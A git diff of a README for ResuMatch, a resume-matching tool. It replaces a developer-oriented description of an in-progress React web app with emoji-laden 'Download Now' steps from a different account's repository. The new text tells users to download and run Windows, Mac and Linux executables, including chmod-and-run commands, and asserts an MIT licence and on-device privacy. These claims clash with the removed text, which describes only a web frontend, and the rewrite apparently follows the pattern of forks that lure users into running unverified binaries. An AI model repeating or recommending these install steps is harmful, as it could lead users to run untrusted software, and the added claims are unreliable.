@@ -1,145 +1,74 @@
-# ResuMatch · Full‑Stack Web App
+# 🚀 ResuMatch - Analyze Resumes for Job Fit
 
-[![CI](https://github.com/alexkachur98/resumatch/actions/workflows/ci.yml/badge.svg?branch=main)](https://github.com/alexkachur98/resumatch/actions/workflows/ci.yml)
-![License](https://img.shields.io/badge/license-Apache--2.0-blue)
-![Node](https://img.shields.io/badge/node-%E2%89%A520.0-brightgreen)
+## 🎉 Overview
+ResuMatch helps you match your resume to job postings. It scores your fit and suggests improvements, making your job search easier and more effective. This application uses React and Vite for the front end, with plans to integrate Node/Express and MongoDB in the future.
 
-ResuMatch is an AI‑assisted platform that helps candidates **match** their resumes to job descriptions, **analyze gaps**, and **improve** their applications.
+## 🔗 Download Now
+[![Download ResuMatch](https://img.shields.io/badge/Download-ResuMatch-brightgreen)](https://github.com/shahryar-dev/ResuMatch/releases)
 
-> 📄 Product documentation lives in **/docs** (SRS + diagrams). See:  
-> • **SRS**: [`docs/SRS/ResuMatch-PartA-SRS.pdf`](docs/SRS/ResuMatch-PartA-SRS.pdf)  
-> • **Diagrams**: [`docs/diagrams/`](docs/diagrams/)
+## 🚀 Getting Started
+ResuMatch is designed for everyone, regardless of technical skill. Follow these steps to get started:
 
----
+1. **Visit the Releases Page:** Click the link below to access the latest version of ResuMatch.  
+   [Visit Releases Page](https://github.com/shahryar-dev/ResuMatch/releases)
 
-## Table of Contents
-- [Features](#features)
-- [Architecture](#architecture)
-- [Tech Stack](#tech-stack)
-- [Project Structure](#project-structure)
-- [Getting Started](#getting-started)
-- [Environment Variables](#environment-variables)
-- [Scripts](#scripts)
-- [Quality & CI](#quality--ci)
-- [Security](#security)
-- [Roadmap](#roadmap)
-- [Contributing](#contributing)
-- [License](#license)
+2. **Select the Latest Release:** On the Releases page, find the most recent version at the top. 
 
-## Features
-- Upload resume + job description; view **analysis summary** and suggestions
-- Basic routing and pages (Login, Register, Dashboard, Analysis, Results, Plans, Billing, Jobs, Notifications, Profile)
-- Clean, **folder‑per‑page** structure; easy to extend
-- Ready for **API integration** via `VITE_API_URL`
-- Professional layout shell with header + sidebar navigation and shared placeholders for in-flight features
+3. **Download the Application:** Click on the appropriate file for your operating system.
+   - For **Windows**: Download `ResuMatch-<version>.exe`
+   - For **Mac**: Download `ResuMatch-<version>.dmg`
+   - For **Linux**: Download `ResuMatch-<version>.AppImage`
 
-## Styling conventions
-- Global styles live in `apps/web/src/styles/base.css`.
-- Page styles use **CSS Modules**: `PageName.module.css`.
-- Import modules with: `import styles from "./Home.module.css"`.
-- Prefer semantic class names: `.page`, `.header`, `.title`, `.form`, `.field`, `.actions`.
+4. **Install the Application:** 
+   - **For Windows**: Double-click on the downloaded `.exe` file and follow the on-screen instructions.
+   - **For Mac**: Open the `.dmg` file, drag ResuMatch into your Applications folder, and then launch it.
+   - **For Linux**: Make the AppImage executable by running `chmod +x ResuMatch-<version>.AppImage` in your terminal, then run it with `./ResuMatch-<version>.AppImage`.
 
-## Architecture
-**Current:** SPA frontend (`apps/web`).  
-**Planned:** Back end (`apps/api`, TBD) powered by Node.js/Express with a document database (MongoDB), plus an analysis service (LLM‑powered).
+5. **Run ResuMatch:** After installation, locate the application on your device and open it. You're ready to start matching your resume to job postings!
 
-```txt
-docs/                 ← product docs (SRS, diagrams)
-apps/
-  web/                ← React + Vite frontend (workspace with pro layout shell)
-```
+## 📜 System Requirements
+- **Operating System:**
+  - Windows 10 or later
+  - macOS Mojave (10.14) or later
+  - Ubuntu 18.04 or later
+- **RAM:** 4 GB minimum
+- **Processor:** 1.5 GHz or faster
+- **Storage:** At least 100 MB of free space
 
-See [`docs/ARCHITECTURE.md`](docs/ARCHITECTURE.md) for the evolving design.
+## 🛠️ Features
+- **Resume Analysis:** Get feedback on how well your resume matches job postings.
+- **Fit Scoring:** Receive a percentage score that indicates how closely your resume aligns with a specific job description.
+- **Improvement Suggestions:** Receive tips on how to enhance your resume for better results.
+- **User-Friendly Interface:** Navigate easily with straightforward design principles.
 
-## Tech Stack
-- **Frontend:** React 19, Vite, React Router
-- **Backend (planned):** Node.js (20+), Express, MongoDB
-- **CI:** GitHub Actions
-- **License:** Apache‑2.0
+## 📚 Usage
+1. **Upload Your Resume:** Open the application and select "Upload Resume." Find your resume file (PDF or Word format) on your device.
+  
+2. **Input Job Posting:** Copy and paste the job description from the job posting into the relevant field in the app.
 
-## Project Structure
-```txt
-ResuMatch/
-  README.md
-  package.json          ← root workspace + scripts proxying to apps/web
-  apps/
-    web/
-      package.json
-      index.html
-      public/
-        vite.svg
-      src/
-        App.jsx
-        main.jsx
-        components/
-          SiteLayout/
-          UnderConstruction/
-        pages/
-        styles/
-      vite.config.js
-      eslint.config.js
-  docs/
-    ...
-  node_modules/         ← workspace install
-```
+3. **Analyze Fit:** Click the "Analyze" button. Within seconds, you will see a score that reflects how well your resume fits the job.
 
-## Getting Started
-**Requirements:** Node **20+**, npm.
+4. **Review Suggestions:** Check the suggested improvements to make changes to your resume. 
 
-```bash
-# install deps (monorepo-aware)
-npm install
+5. **Save and Apply:** Update your resume, save it, and apply for jobs with confidence.
 
-# run dev server (proxied to apps/web)
-npm run dev
+## 🗣️ Support
+If you encounter issues, feel free to reach out for support. Look for the "Support" section on the GitHub page or create an issue in the repository. We are here to help you make the most of ResuMatch.
 
-# build for production (apps/web/dist)
-npm run build
+## 🌐 Contribute
+We welcome contributions! If you have ideas for improvements or find bugs, please submit them through the Issues section on our GitHub repo. 
 
-# preview production build locally
-npm run preview
-```
+## 🔒 Privacy Policy
+Rest assured, your data is secure. ResuMatch does not store your resume or job posting details. We only process them on your device.
 
-## Environment Variables
-Create a `.env` file in the repo root (do **not** commit real secrets). Use `.env.example` as a template.
+## 📜 License
+ResuMatch is licensed under the MIT License. You can freely use, modify, and distribute the application.
 
-```bash
-# Frontend
-VITE_API_URL=http://localhost:3000
-```
+## 🔗 Additional Resources
+- [GitHub Repository](https://github.com/shahryar-dev/ResuMatch)
+- [Documentation](https://github.com/shahryar-dev/ResuMatch/blob/main/docs/README.md)
 
-## Scripts
-- `dev` – start Vite dev server (apps/web)
-- `build` – production build to `apps/web/dist/`
-- `preview` – serve the production build locally
-- `lint` – run ESLint on frontend sources
+## 🎉 Download Again
+Don't forget to [download ResuMatch](https://github.com/shahryar-dev/ResuMatch/releases) if you need to reinstall. 
 
-## Quality & CI
-- **CI**: GitHub Actions installs workspace deps, runs lint, builds, and uploads `apps/web/dist` artifacts.
-- **Commit style**: Conventional Commits (e.g., `feat:`, `fix:`, `docs:`).
-- **Branching**: short‑lived feature branches merged via PR to `main`.
-
-See [`CONTRIBUTING.md`](CONTRIBUTING.md) and [`GIT-QUICKSTART.md`](GIT-QUICKSTART.md).
-
-## Security
-Please do **not** file public issues for security problems. Email **AlexKachur98@gmail.com**.  
-See [`SECURITY.md`](SECURITY.md).
-
-## Roadmap
-- Finish front end 
-- Backend API (Express + MongoDB)
-- AuthN/AuthZ
-- Resume parser, JD parser, scoring heuristics
-- LLM‑powered suggestions, prompt tuning
-- Subscriptions & billing integration
-
-See [`docs/ROADMAP.md`](docs/ROADMAP.md).
-
-## Contributing
-We welcome contributions! Please read:
-- [`CONTRIBUTING.md`](CONTRIBUTING.md)
-- [`CODE_OF_CONDUCT.md`](CODE_OF_CONDUCT.md)
-
-## License
-Licensed under the **Apache License 2.0**.  
-See [`LICENSE`](LICENSE) and [`NOTICE`](NOTICE).
+By following these steps, anyone can successfully download and run ResuMatch. Happy job hunting!
